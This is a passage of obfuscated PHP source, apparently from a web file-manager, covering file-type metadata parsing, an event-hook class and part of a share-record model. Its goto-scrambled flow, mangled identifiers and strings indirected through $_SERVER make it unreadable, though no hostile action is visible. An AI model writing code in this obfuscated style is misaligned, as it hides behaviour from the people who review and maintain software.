$DÎ‡Ô›¬¯Ñ[1614] . $CíÌΩÜ—Ã›[$DÎ‡Ô›¬¯Ñ[75]]; goto f¿ºå°åØ≤; f—â›Ÿãå¿: $cÌûáöŒœ–[$DÎ‡Ô›¬¯Ñ[372]] = $Dı›ú‡ÓÈ…; $CíÌΩÜ—Ã›[$DÎ‡Ô›¬¯Ñ[426]] = $cÌûáöŒœ–; return $CíÌΩÜ—Ã›; goto E—∫ÔÌôñî; f¿ºå°åØ≤: $Dı›ú‡ÓÈ… = $CíÌΩÜ—Ã›[$DÎ‡Ô›¬¯Ñ[160]]; try { if ($CíÌΩÜ—Ã›[$DÎ‡Ô›¬¯Ñ[160]] == $DÎ‡Ô›¬¯Ñ[1615]) { $cÌûáöŒœ– = self::psdParse($Aó§Ñ§ô‡Ï); $Dı›ú‡ÓÈ… = $DÎ‡Ô›¬¯Ñ[1616]; } else { if ($CíÌΩÜ—Ã›[$DÎ‡Ô›¬¯Ñ[160]] == $DÎ‡Ô›¬¯Ñ[1617]) { $cÌûáöŒœ– = self::pdfParse($Aó§Ñ§ô‡Ï); } else { $Dı›ú‡ÓÈ… = self::$fileTypeArray[$DÎ‡Ô›¬¯Ñ[1618]][$CíÌΩÜ—Ã›[$DÎ‡Ô›¬¯Ñ[160]]]; $fÑ°µÙäÑ„ = self::$fileTypeArray[$DÎ‡Ô›¬¯Ñ[1619]][$Dı›ú‡ÓÈ…][$DÎ‡Ô›¬¯Ñ[1620]]; $eŒ‘ÍŒ√«Ω = @$aÌÚ±πçäÖ->analyze($Aó§Ñ§ô‡Ï, $CíÌΩÜ—Ã›[$DÎ‡Ô›¬¯Ñ[77]], $CíÌΩÜ—Ã›[$DÎ‡Ô›¬¯Ñ[28]]); $cÌûáöŒœ– = self::parseData($eŒ‘ÍŒ√«Ω, $fÑ°µÙäÑ„, $CíÌΩÜ—Ã›); } } } catch (Exception $aªâ£¢≈∫–) { $cÌûáöŒœ– = array($DÎ‡Ô›¬¯Ñ[372] => $Dı›ú‡ÓÈ…); } if (!$cÌûáöŒœ–) { return; } goto f—â›Ÿãå¿; E—∫ÔÌôñî: } public static function support($fâ¶ÔÜÊåò) { goto Bû©∂¢êÖ≈; CÃÆ°ÃÇ¬â: $Cõ÷…¶âé› = array($Eã©⁄¡ﬁë◊[1617], $Eã©⁄¡ﬁë◊[1615]); if (in_array($fâ¶ÔÜÊåò, $Cõ÷…¶âé›)) { return !0; } if (isset(self::$fileTypeArray[$Eã©⁄¡ﬁë◊[1618]][$fâ¶ÔÜÊåò])) { return !0; } goto Bå∂≈≠ø∂∂; Bû©∂¢êÖ≈: $Eã©⁄¡ﬁë◊ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $fâ¶ÔÜÊåò = strtolower($fâ¶ÔÜÊåò); goto CÃÆ°ÃÇ¬â; Bå∂≈≠ø∂∂: return !1; goto Dñ¢√å∞º⁄; Dñ¢√å∞º⁄: } private static function parseData($Aõ«ÖÜÂ∏‹, $c«Îü«≤Èú, $dúø‚‹ëì‘) { $cÓ®€ÇèËè =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $BÛıê—ù©Ç = $Aõ«ÖÜÂ∏‹[$cÓ®€ÇèËè[1621]]; $c∑¢‘à°ßã = array(); foreach ($c«Îü«≤Èú as $A©ÂÑÿ´€â => $bËÑÃÜ‹ÇŒ) { foreach ($bËÑÃÜ‹ÇŒ as $eùêöÓÉ™Ò) { if (is_array($eùêöÓÉ™Ò)) { $Fô∆∆èÆ¶‡ = self::parseData($Aõ«ÖÜÂ∏‹, $bËÑÃÜ‹ÇŒ, $dúø‚‹ëì‘); if ($Fô∆∆èÆ¶‡) { $c∑¢‘à°ßã[$A©ÂÑÿ´€â] = $Fô∆∆èÆ¶‡; } break; } $b¢â˜æ•µ› = str_replace($cÓ®€ÇèËè[1391], $BÛıê—ù©Ç, $eùêöÓÉ™Ò); $Fô∆∆èÆ¶‡ = _get($Aõ«ÖÜÂ∏‹, $b¢â˜æ•µ›); $Fô∆∆èÆ¶‡ = is_array($Fô∆∆èÆ¶‡) ? $Fô∆∆èÆ¶‡[0] : $Fô∆∆èÆ¶‡; if ($Fô∆∆èÆ¶‡) { break; } } if ($Fô∆∆èÆ¶‡ || $Fô∆∆èÆ¶‡ === 0 || $Fô∆∆èÆ¶‡ === !1) { $Fô∆∆èÆ¶‡ = self::valueReset($eùêöÓÉ™Ò, $Fô∆∆èÆ¶‡, $A©ÂÑÿ´€â); if ($Fô∆∆èÆ¶‡ !== null) { $c∑¢‘à°ßã[$A©ÂÑÿ´€â] = $Fô∆∆èÆ¶‡; } } } $c∑¢‘à°ßã = self::valueResetAll($c∑¢‘à°ßã, $dúø‚‹ëì‘); return $c∑¢‘à°ßã; } private static function psdParse($BèÚÉﬂÆ—±) { $bÎ≠Òòß°≤ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (IO::fileSubstr($BèÚÉﬂÆ—±, 0, 4) != $bÎ≠Òòß°≤[1622]) { return !1; } $a§ÖÒçÌÿ› = getImageSize($BèÚÉﬂÆ—±, $Bé Ñ™Á”«); if (!$a§ÖÒçÌÿ›) { return; } $EÂæ≈√ … = array($bÎ≠Òòß°≤[1537] => $a§ÖÒçÌÿ›[0], $bÎ≠Òòß°≤[1539] => $a§ÖÒçÌÿ›[1]); return $EÂæ≈√ …; } private static function pdfParse($e„∞çÌ¨ı¥) { return FileParsePdf::parse($e„∞çÌ¨ı¥); } private static function fileTypeParse() { $dêÜ™¬ë√˘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cóÛµ∂ÿ’∆ = self::fileTypeArray(); $bÖ¯¨∞Çë = array(); foreach ($cóÛµ∂ÿ’∆ as $bé“ö‘åÂ¨ => $e∏‰Õ√àËÈ) { $d∞≥›–™ˆï = _get($e∏‰Õ√àËÈ, $dêÜ™¬ë√˘[160], $dêÜ™¬ë√˘[33]); $Bò–”∆…¡ﬁ = is_string($d∞≥›–™ˆï) ? explode($dêÜ™¬ë√˘[47], $d∞≥›–™ˆï) : $d∞≥›–™ˆï; if (!$Bò–”∆…¡ﬁ) { continue; } foreach ($Bò–”∆…¡ﬁ as $d∞≥›–™ˆï) { $d∞≥›–™ˆï = strtolower(trim($d∞≥›–™ˆï)); if (!$d∞≥›–™ˆï) { continue; } $bÖ¯¨∞Çë[$d∞≥›–™ˆï] = $bé“ö‘åÂ¨; } $cóÛµ∂ÿ’∆[$bé“ö‘åÂ¨][$dêÜ™¬ë√˘[160]] = array_keys($bÖ¯¨∞Çë); $cóÛµ∂ÿ’∆[$bé“ö‘åÂ¨][$dêÜ™¬ë√˘[1620]] = self::parseKeyMap($e∏‰Õ√àËÈ[$dêÜ™¬ë√˘[1620]]); } return array($dêÜ™¬ë√˘[1619] => $cóÛµ∂ÿ’∆, $dêÜ™¬ë√˘[1618] => $bÖ¯¨∞Çë); } private static function parseKeyMap($F¿¡âÜ‹«Ö) { $b∆â¥á®≥ç =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; foreach ($F¿¡âÜ‹«Ö as $eΩÃÖÌÏ˘∫ => $DÎ›ê¥Øà—) { if (is_array($DÎ›ê¥Øà—)) { $A€™ßõÆ∑Ò = self::parseKeyMap($DÎ›ê¥Øà—); if ($A€™ßõÆ∑Ò) { $F¿¡âÜ‹«Ö[$eΩÃÖÌÏ˘∫] = $A€™ßõÆ∑Ò; } continue; } $dâùÀ§Ÿ“≠ = explode($b∆â¥á®≥ç[47], $DÎ›ê¥Øà—); $cŒ∂∂Öåéç = array(); foreach ($dâùÀ§Ÿ“≠ as $bëøèè∞˘∆) { $bëøèè∞˘∆ = trim($bëøèè∞˘∆); if (!$bëøèè∞˘∆) { continue; } if (preg_match($b∆â¥á®≥ç[1623], $bëøèè∞˘∆, $eøóçÒÚıˆ)) { $eÛÙ˜úÑò‡ = explode($b∆â¥á®≥ç[271], $eøóçÒÚıˆ[1]); foreach ($eÛÙ˜úÑò‡ as $fÃÑâÌÔ¨Ω) { $cŒ∂∂Öåéç[] = str_replace($eøóçÒÚıˆ[0], $fÃÑâÌÔ¨Ω, $bëøèè∞˘∆); } } else { $cŒ∂∂Öåéç[] = $bëøèè∞˘∆; } } $F¿¡âÜ‹«Ö[$eΩÃÖÌÏ˘∫] = $cŒ∂∂Öåéç; } return $F¿¡âÜ‹«Ö; } private static function valueResetAll($e∏ÜƒÍ∏ıΩ, $A¯‹≥ìÏı°) { goto dÃıÑ¶éÇå; dÃıÑ¶éÇå: $EÆèœÚµßÎ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (isset($e∏ÜƒÍ∏ıΩ[$EÆèœÚµßÎ[1624]])) { $C¿‘‰ç¢ìÖ = ceil($e∏ÜƒÍ∏ıΩ[$EÆèœÚµßÎ[1624]]); $fïÃçáÖºç = intval($C¿‘‰ç¢ìÖ / 3600); $EﬂíéÆüÈã = intval(($C¿‘‰ç¢ìÖ - $fïÃçáÖºç * 3600) / 60); $A€åÓ≠Ï€´ = $C¿‘‰ç¢ìÖ % 60; $e∏ÜƒÍ∏ıΩ[$EÆèœÚµßÎ[1625]] = sprintf($EÆèœÚµßÎ[1626], $fïÃçáÖºç, $EﬂíéÆüÈã, $A€åÓ≠Ï€´); if ($fïÃçáÖºç == 0) { $e∏ÜƒÍ∏ıΩ[$EÆèœÚµßÎ[1625]] = sprintf($EÆèœÚµßÎ[1627], $EﬂíéÆüÈã, $A€åÓ≠Ï€´); } } $f°ïâı∫´Ê = _get($e∏ÜƒÍ∏ıΩ, $EÆèœÚµßÎ[1628]); goto Då“â‡Æ∂Ï; Då“â‡Æ∂Ï: if ($f°ïâı∫´Ê) { $BÃà∂ΩË»Ù = IO_PATH_SYSTEM_TEMP . $EÆèœÚµßÎ[1629] . KodIO::hashPath($A¯‹≥ìÏı°) . $EÆèœÚµßÎ[1630]; $e∏ÜƒÍ∏ıΩ[$EÆèœÚµßÎ[1631]] = Action($EÆèœÚµßÎ[1632])->pluginCacheFileSet($BÃà∂ΩË»Ù, $f°ïâı∫´Ê); unset($e∏ÜƒÍ∏ıΩ[$EÆèœÚµßÎ[1633]][$EÆèœÚµßÎ[1616]]); } $a‡–®À≠∞Ë = _get($e∏ÜƒÍ∏ıΩ, $EÆèœÚµßÎ[1634], $EÆèœÚµßÎ[33]); $eÇÿπ≈ﬂÓ∏ = _get($e∏ÜƒÍ∏ıΩ, $EÆèœÚµßÎ[1635], $EÆèœÚµßÎ[33]); goto dè‹Ò¥Üı“; dè‹Ò¥Üı“: $F•¢ú¯¿Îú = _get($e∏ÜƒÍ∏ıΩ, $EÆèœÚµßÎ[1636], $EÆèœÚµßÎ[33]); $d◊∂òãº•Á = $a‡–®À≠∞Ë . $eÇÿπ≈ﬂÓ∏ . $F•¢ú¯¿Îú; if ($d◊∂òãº•Á && get_charset($d◊∂òãº•Á) != $EÆèœÚµßÎ[326]) { $e∏ÜƒÍ∏ıΩ[$EÆèœÚµßÎ[1633]][$EÆèœÚµßÎ[1344]] = iconv_to($e∏ÜƒÍ∏ıΩ[$EÆèœÚµßÎ[1633]][$EÆèœÚµßÎ[1344]], get_charset($d◊∂òãº•Á), $EÆèœÚµßÎ[326]); $e∏ÜƒÍ∏ıΩ[$EÆèœÚµßÎ[1633]][$EÆèœÚµßÎ[1637]] = iconv_to($e∏ÜƒÍ∏ıΩ[$EÆèœÚµßÎ[1633]][$EÆèœÚµßÎ[1637]], get_charset($d◊∂òãº•Á), $EÆèœÚµßÎ[326]); $e∏ÜƒÍ∏ıΩ[$EÆèœÚµßÎ[1633]][$EÆèœÚµßÎ[1638]] = iconv_to($e∏ÜƒÍ∏ıΩ[$EÆèœÚµßÎ[1633]][$EÆèœÚµßÎ[1638]], get_charset($d◊∂òãº•Á), $EÆèœÚµßÎ[326]); } goto aËÇ£Íè¡™; aËÇ£Íè¡™: return $e∏ÜƒÍ∏ıΩ; goto eßÿ†±ƒ√Ø; eßÿ†±ƒ√Ø: } private static function valueReset($F≈Œè«Áÿ¶, $B™§ü¯¯œÔ, $B∆„„∫ﬂ´Ó) { $eû«ÛÒ·¨® =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dﬁ„É±Ô‚¬ = $eû«ÛÒ·¨®[1554]; switch ($F≈Œè«Áÿ¶) { case $eû«ÛÒ·¨®[1639]: $B™§ü¯¯œÔ = $B™§ü¯¯œÔ == $eû«ÛÒ·¨®[83] ? $eû«ÛÒ·¨®[1640] : $eû«ÛÒ·¨®[1641]; break; case $eû«ÛÒ·¨®[1642]: $B™§ü¯¯œÔ = $B™§ü¯¯œÔ ? $B™§ü¯¯œÔ : null; break; default: break; } switch ($B∆„„∫ﬂ´Ó) { case $eû«ÛÒ·¨®[1643]: $B™§ü¯¯œÔ = round($B™§ü¯¯œÔ, 2); break; case $eû«ÛÒ·¨®[187]: case $eû«ÛÒ·¨®[107]: if ($B™§ü¯¯œÔ < 0) { $B™§ü¯¯œÔ = null; } else { if (is_numeric($B™§ü¯¯œÔ)) { $B™§ü¯¯œÔ = date($dﬁ„É±Ô‚¬, $B™§ü¯¯œÔ); } } break; default: break; } return $B™§ü¯¯œÔ; } private static function fileTypeArray() { $Bõ…ﬂ¯ô‡‚ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return array($Bõ…ﬂ¯ô‡‚[1616] => array($Bõ…ﬂ¯ô‡‚[160] => $Bõ…ﬂ¯ô‡‚[1644] . $Bõ…ﬂ¯ô‡‚[1645], $Bõ…ﬂ¯ô‡‚[1620] => array($Bõ…ﬂ¯ô‡‚[1537] => $Bõ…ﬂ¯ô‡‚[1646], $Bõ…ﬂ¯ô‡‚[1539] => $Bõ…ﬂ¯ô‡‚[1647], $Bõ…ﬂ¯ô‡‚[1648] => $Bõ…ﬂ¯ô‡‚[1649], $Bõ…ﬂ¯ô‡‚[1650] => $Bõ…ﬂ¯ô‡‚[1651], $Bõ…ﬂ¯ô‡‚[187] => $Bõ…ﬂ¯ô‡‚[1652], $Bõ…ﬂ¯ô‡‚[107] => $Bõ…ﬂ¯ô‡‚[1653], $Bõ…ﬂ¯ô‡‚[1654] => $Bõ…ﬂ¯ô‡‚[1655], $Bõ…ﬂ¯ô‡‚[1656] => $Bõ…ﬂ¯ô‡‚[1657], $Bõ…ﬂ¯ô‡‚[1658] => $Bõ…ﬂ¯ô‡‚[1659], $Bõ…ﬂ¯ô‡‚[1660] => $Bõ…ﬂ¯ô‡‚[1661], $Bõ…ﬂ¯ô‡‚[1662] => $Bõ…ﬂ¯ô‡‚[1663], $Bõ…ﬂ¯ô‡‚[1664] => $Bõ…ﬂ¯ô‡‚[1665], $Bõ…ﬂ¯ô‡‚[1666] => $Bõ…ﬂ¯ô‡‚[1667], $Bõ…ﬂ¯ô‡‚[1668] => array($Bõ…ﬂ¯ô‡‚[1669] => $Bõ…ﬂ¯ô‡‚[1670], $Bõ…ﬂ¯ô‡‚[1671] => $Bõ…ﬂ¯ô‡‚[1672], $Bõ…ﬂ¯ô‡‚[1673] => $Bõ…ﬂ¯ô‡‚[1674]), $Bõ…ﬂ¯ô‡‚[1675] => $Bõ…ﬂ¯ô‡‚[1676], $Bõ…ﬂ¯ô‡‚[1677] => $Bõ…ﬂ¯ô‡‚[1678], $Bõ…ﬂ¯ô‡‚[1679] => $Bõ…ﬂ¯ô‡‚[1680], $Bõ…ﬂ¯ô‡‚[1681] => $Bõ…ﬂ¯ô‡‚[1682], $Bõ…ﬂ¯ô‡‚[1683] => array($Bõ…ﬂ¯ô‡‚[1684] => $Bõ…ﬂ¯ô‡‚[1685], $Bõ…ﬂ¯ô‡‚[1686] => $Bõ…ﬂ¯ô‡‚[1687], $Bõ…ﬂ¯ô‡‚[1688] => $Bõ…ﬂ¯ô‡‚[1689], $Bõ…ﬂ¯ô‡‚[1690] => $Bõ…ﬂ¯ô‡‚[1691], $Bõ…ﬂ¯ô‡‚[1692] => $Bõ…ﬂ¯ô‡‚[1693], $Bõ…ﬂ¯ô‡‚[1694] => $Bõ…ﬂ¯ô‡‚[1695], $Bõ…ﬂ¯ô‡‚[1696] => $Bõ…ﬂ¯ô‡‚[1697], $Bõ…ﬂ¯ô‡‚[1698] => $Bõ…ﬂ¯ô‡‚[1699], $Bõ…ﬂ¯ô‡‚[1700] => $Bõ…ﬂ¯ô‡‚[1701], $Bõ…ﬂ¯ô‡‚[1702] => $Bõ…ﬂ¯ô‡‚[1703], $Bõ…ﬂ¯ô‡‚[1704] => $Bõ…ﬂ¯ô‡‚[1705]))), $Bõ…ﬂ¯ô‡‚[1706] => array($Bõ…ﬂ¯ô‡‚[160] => $Bõ…ﬂ¯ô‡‚[1707] . $Bõ…ﬂ¯ô‡‚[1708], $Bõ…ﬂ¯ô‡‚[1620] => array($Bõ…ﬂ¯ô‡‚[1624] => $Bõ…ﬂ¯ô‡‚[1709], $Bõ…ﬂ¯ô‡‚[187] => $Bõ…ﬂ¯ô‡‚[1710], $Bõ…ﬂ¯ô‡‚[107] => $Bõ…ﬂ¯ô‡‚[1711], $Bõ…ﬂ¯ô‡‚[1656] => $Bõ…ﬂ¯ô‡‚[1712], $Bõ…ﬂ¯ô‡‚[1713] => $Bõ…ﬂ¯ô‡‚[1714], $Bõ…ﬂ¯ô‡‚[1715] => $Bõ…ﬂ¯ô‡‚[1642], $Bõ…ﬂ¯ô‡‚[1716] => $Bõ…ﬂ¯ô‡‚[1717], $Bõ…ﬂ¯ô‡‚[1718] => $Bõ…ﬂ¯ô‡‚[1719], $Bõ…ﬂ¯ô‡‚[1720] => $Bõ…ﬂ¯ô‡‚[1721], $Bõ…ﬂ¯ô‡‚[1633] => array($Bõ…ﬂ¯ô‡‚[1344] => $Bõ…ﬂ¯ô‡‚[1722], $Bõ…ﬂ¯ô‡‚[1637] => $Bõ…ﬂ¯ô‡‚[1723], $Bõ…ﬂ¯ô‡‚[1638] => $Bõ…ﬂ¯ô‡‚[1724], $Bõ…ﬂ¯ô‡‚[1725] => $Bõ…ﬂ¯ô‡‚[1726], $Bõ…ﬂ¯ô‡‚[1727] => $Bõ…ﬂ¯ô‡‚[1728], $Bõ…ﬂ¯ô‡‚[1729] => $Bõ…ﬂ¯ô‡‚[1730], $Bõ…ﬂ¯ô‡‚[1616] => $Bõ…ﬂ¯ô‡‚[1731]))), $Bõ…ﬂ¯ô‡‚[1732] => array($Bõ…ﬂ¯ô‡‚[160] => $Bõ…ﬂ¯ô‡‚[1733] . $Bõ…ﬂ¯ô‡‚[1734], $Bõ…ﬂ¯ô‡‚[1620] => array($Bõ…ﬂ¯ô‡‚[1537] => $Bõ…ﬂ¯ô‡‚[1735], $Bõ…ﬂ¯ô‡‚[1539] => $Bõ…ﬂ¯ô‡‚[1736], $Bõ…ﬂ¯ô‡‚[1624] => $Bõ…ﬂ¯ô‡‚[1709], $Bõ…ﬂ¯ô‡‚[187] => $Bõ…ﬂ¯ô‡‚[1737], $Bõ…ﬂ¯ô‡‚[107] => $Bõ…ﬂ¯ô‡‚[1738], $Bõ…ﬂ¯ô‡‚[1643] => $Bõ…ﬂ¯ô‡‚[1739], $Bõ…ﬂ¯ô‡‚[1720] => $Bõ…ﬂ¯ô‡‚[1740], $Bõ…ﬂ¯ô‡‚[1716] => $Bõ…ﬂ¯ô‡‚[1741], $Bõ…ﬂ¯ô‡‚[1656] => $Bõ…ﬂ¯ô‡‚[1742], $Bõ…ﬂ¯ô‡‚[1706] => array($Bõ…ﬂ¯ô‡‚[1715] => $Bõ…ﬂ¯ô‡‚[1642], $Bõ…ﬂ¯ô‡‚[1743] => $Bõ…ﬂ¯ô‡‚[1744], $Bõ…ﬂ¯ô‡‚[1713] => $Bõ…ﬂ¯ô‡‚[1714], $Bõ…ﬂ¯ô‡‚[1720] => $Bõ…ﬂ¯ô‡‚[1721], $Bõ…ﬂ¯ô‡‚[1716] => $Bõ…ﬂ¯ô‡‚[1745], $Bõ…ﬂ¯ô‡‚[1718] => $Bõ…ﬂ¯ô‡‚[1719]))), $Bõ…ﬂ¯ô‡‚[1746] => array($Bõ…ﬂ¯ô‡‚[1620] => array($Bõ…ﬂ¯ô‡‚[1747] => $Bõ…ﬂ¯ô‡‚[1748], $Bõ…ﬂ¯ô‡‚[1749] => $Bõ…ﬂ¯ô‡‚[1750])), $Bõ…ﬂ¯ô‡‚[1751] => array($Bõ…ﬂ¯ô‡‚[1620] => array())); } } class Hook { private static $events = array(); public static function get($a´ÔÔ∫üœ∆ = false) { if (!$a´ÔÔ∫üœ∆) { return self::$events; } else { return self::$events[$a´ÔÔ∫üœ∆]; } } public static function apply($aß¯ëŸâπä, $E“Ï¶ïƒ≤∫ = array()) { $d©Ø—çÀƒ™ = ActionApply($aß¯ëŸâπä, $E“Ï¶ïƒ≤∫); if (is_string($aß¯ëŸâπä)) { Hook::trigger($aß¯ëŸâπä); } return $d©Ø—çÀƒ™; } public static function bind($c∆ƒ‡ìÿëç, $d‚ÂêÁèî™, $aãØµ∆ËÁ‘ = false) { $Dóç¥”äŒá =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!isset(self::$events[$c∆ƒ‡ìÿëç])) { self::$events[$c∆ƒ‡ìÿëç] = array(); } self::$events[$c∆ƒ‡ìÿëç][] = array($Dóç¥”äŒá[1752] => $d‚ÂêÁèî™, $Dóç¥”äŒá[1753] => $aãØµ∆ËÁ‘, $Dóç¥”äŒá[1754] => 0); } public static function once($cè¢ÙÊ—≈Ñ, $aıŒµå∆ÜÇ) { self::bind($cè¢ÙÊ—≈Ñ, $aıŒµå∆ÜÇ, !0); } public static function unbind($EåÛ§óÉ≤ñ, $EÖÁïéå‡· = false) { if (!$EÖÁïéå‡·) { self::$events[$EåÛ§óÉ≤ñ] = array(); return; } $Báî®ÃáÉ‚ = self::$events[$EåÛ§óÉ≤ñ]; self::$events[$EåÛ§óÉ≤ñ] = array(); if (!is_array($Báî®ÃáÉ‚)) { return; } for ($FÏ—„ÖﬁìØ = 0; $FÏ—„ÖﬁìØ < count($Báî®ÃáÉ‚); $FÏ—„ÖﬁìØ++) { if ($Báî®ÃáÉ‚[$FÏ—„ÖﬁìØ][$_SERVER[Ä¿¡‡öóµŸﬂ‡][1752]] == $EÖÁïéå‡·) { continue; } self::$events[$EåÛ§óÉ≤ñ][] = $Báî®ÃáÉ‚[$FÏ—„ÖﬁìØ]; } } public static function filter($dÎãîøøßá, $f çÈÿ‹≠ß) { goto Fá∞õ∂ﬁíõ; F∂…˘©‹—Ñ: $béº¡◊…†î = $E∆àÉëÉÖÓ[$dÎãîøøßá]; $Bµ⁄Üß∫¨’ = $f çÈÿ‹≠ß; if (!is_array($béº¡◊…†î) || count($béº¡◊…†î) == 0) { return $Bµ⁄Üß∫¨’; } goto FÎ√∑œÿÔ€; FÎ√∑œÿÔ€: for ($d—Ωîçîâî = 0; $d—Ωîçîâî < count($béº¡◊…†î); $d—Ωîçîâî++) { $A™Ú◊õ∏üê = $béº¡◊…†î[$d—Ωîçîâî]; if ($A™Ú◊õ∏üê[$D¯¶ê⁄‹˜¥[1753]] && $A™Ú◊õ∏üê[$D¯¶ê⁄‹˜¥[1754]] > 1) { continue; } self::$events[$dÎãîøøßá][$d—Ωîçîâî][$D¯¶ê⁄‹˜¥[1754]] = $A™Ú◊õ∏üê[$D¯¶ê⁄‹˜¥[1754]] + 1; $eø◊¶¶§ªï = self::apply($A™Ú◊õ∏üê[$D¯¶ê⁄‹˜¥[1752]], array($Bµ⁄Üß∫¨’)); if (gettype($eø◊¶¶§ªï) == gettype($Bµ⁄Üß∫¨’)) { $Bµ⁄Üß∫¨’ = $eø◊¶¶§ªï; } } return $Bµ⁄Üß∫¨’; goto DÖïÁàåÎ°; Fá∞õ∂ﬁíõ: $D¯¶ê⁄‹˜¥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $E∆àÉëÉÖÓ = self::$events; if (!isset($E∆àÉëÉÖÓ[$dÎãîøøßá])) { return $f çÈÿ‹≠ß; } goto F∂…˘©‹—Ñ; DÖïÁàåÎ°: } public static function trigger($F¨ÀÎ“Ö¥Ø) { goto f—ç¯˜‡Æê; C¯îñáÔŸ : if (!isset($c®∞ç‰€Ã©[$F¨ÀÎ“Ö¥Ø])) { return $d◊õ†Ñá¨Ü; } $fèòÊâÎÉ÷ = $c®∞ç‰€Ã©[$F¨ÀÎ“Ö¥Ø]; if (!is_array($fèòÊâÎÉ÷) || count($fèòÊâÎÉ÷) == 0) { return $d◊õ†Ñá¨Ü; } goto D‚¥™û∞•Ç; D‚¥™û∞•Ç: $BÏù≠£§Öß = func_get_args(); array_shift($BÏù≠£§Öß); for ($C≥‰ã÷Óù∂ = 0; $C≥‰ã÷Óù∂ < count($fèòÊâÎÉ÷); $C≥‰ã÷Óù∂++) { $eåÚí÷ÆÉ≈ = $fèòÊâÎÉ÷[$C≥‰ã÷Óù∂]; if ($eåÚí÷ÆÉ≈[$cªçƒ€ƒ‹ç[1753]] && $eåÚí÷ÆÉ≈[$cªçƒ€ƒ‹ç[1754]] > 1) { continue; } if (defined($cªçƒ€ƒ‹ç[1755]) && GLOBAL_LOG_HOOK) { write_log($F¨ÀÎ“Ö¥Ø . $cªçƒ€ƒ‹ç[1756] . $eåÚí÷ÆÉ≈[$cªçƒ€ƒ‹ç[1752]], $cªçƒ€ƒ‹ç[1757]); } self::$events[$F¨ÀÎ“Ö¥Ø][$C≥‰ã÷Óù∂][$cªçƒ€ƒ‹ç[1754]] = $eåÚí÷ÆÉ≈[$cªçƒ€ƒ‹ç[1754]] + 1; $Eë˜ÉÍÜﬁÔ = self::apply($eåÚí÷ÆÉ≈[$cªçƒ€ƒ‹ç[1752]], $BÏù≠£§Öß); if (defined($cªçƒ€ƒ‹ç[1755]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $cªçƒ€ƒ‹ç[1757]); if ($eåÚí÷ÆÉ≈[$cªçƒ€ƒ‹ç[1754]] == 200) { $FØåÖñ‡€É = is_array($eåÚí÷ÆÉ≈[$cªçƒ€ƒ‹ç[1752]]) ? json_encode_force($eåÚí÷ÆÉ≈[$cªçƒ€ƒ‹ç[1752]]) : $eåÚí÷ÆÉ≈[$cªçƒ€ƒ‹ç[1752]]; write_log($cªçƒ€ƒ‹ç[1758] . $F¨ÀÎ“Ö¥Ø . $cªçƒ€ƒ‹ç[1759] . $FØåÖñ‡€É, $cªçƒ€ƒ‹ç[1760]); } } $d◊õ†Ñá¨Ü = is_null($Eë˜ÉÍÜﬁÔ) ? $d◊õ†Ñá¨Ü : $Eë˜ÉÍÜﬁÔ; } goto C¬éå√¿«ú; f—ç¯˜‡Æê: $cªçƒ€ƒ‹ç =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c®∞ç‰€Ã© = self::$events; $d◊õ†Ñá¨Ü = !1; goto C¯îñáÔŸ ; C¬éå√¿«ú: return $d◊õ†Ñá¨Ü; goto a∆å¢‰‚∆ô; a∆å¢‰‚∆ô: } } goto A¯¥îœìÏí; dûøã˘√¡á: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\x72\145"; protected $dataAuto = array(array("\155\x6f\x64\x69\x66\x79\124\x69\x6d\145", "\164\151\x6d\145", "\151\156\x73\145\162\164\x2c\x75\160\144\141\x74\145", "\146\165\x6e\143\164\151\x6f\156"), array("\143\x72\145\141\164\145\124\x69\155\x65", "\164\x69\x6d\x65", "\151\x6e\163\145\x72\164", "\146\165\156\143\x74\x69\157\x6e"), array("\157\x70\164\x69\157\156\x73", '', "\151\x6e\x73\145\162\x74\54\x75\160\144\141\x74\145\x2c\x73\x65\x6c\145\x63\164", "\x6a\x73\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($AùÖ´Ÿ◊Ã·) { $F¯ËÏ¯ﬂ‡Í =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bÕ‚Ñ›¥£ã = isset($AùÖ´Ÿ◊Ã·[0]) ? $AùÖ´Ÿ◊Ã·[0] : !1; return array($F¯ËÏ¯ﬂ‡Í[2212] => array(USER_ID, $F¯ËÏ¯ﬂ‡Í[2213]), $F¯ËÏ¯ﬂ‡Í[2175] => array($bÕ‚Ñ›¥£ã, $F¯ËÏ¯ﬂ‡Í[2214])); } protected function listSimple() { $AàÖ™ôàÍ… = array($_SERVER[Ä¿¡‡öóµŸﬂ‡][1438] => USER_ID); $C◊ù¥çî ∂ = $this->field($this->fieldList)->where($AàÖ™ôàÍ…)->select(); return $C◊ù¥çî ∂ ? $C◊ù¥çî ∂ : array(); } protected function getInfo($aÏœΩä™∆è, $eíä˘µÑôÓ = false) { $D≈ÿöáÕ»ç =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($eíä˘µÑôÓ) { return $this->_getShareInfo(array($D≈ÿöáÕ»ç[441] => $aÏœΩä™∆è)); } $Dâ÷Àƒ¥É¥ = $this->cacheFunctionGet($D≈ÿöáÕ»ç[2215], $aÏœΩä™∆è); return $Dâ÷Àƒ¥É¥; } public function getInfoByHash($d„Ñ–¬∫Ê) { return $this->_getShareInfo(array($_SERVER[Ä¿¡‡öóµŸﬂ‡][443] => $d„Ñ–¬∫Ê)); } public function getInfoByPath($BÆÁ€˘¨ÍŸ) { $BêÆ∑ê∞∂≈ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $b§øË‘≤⁄ë = array($BêÆ∑ê∞∂≈[1438] => USER_ID, $BêÆ∑ê∞∂≈[369] => $BÆÁ€˘¨ÍŸ); return $this->_getShareInfo($b§øË‘≤⁄ë); } public function getInfoBySourcePath($E≥’Úõÿî) { $FÉÒìπΩÍ∆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; 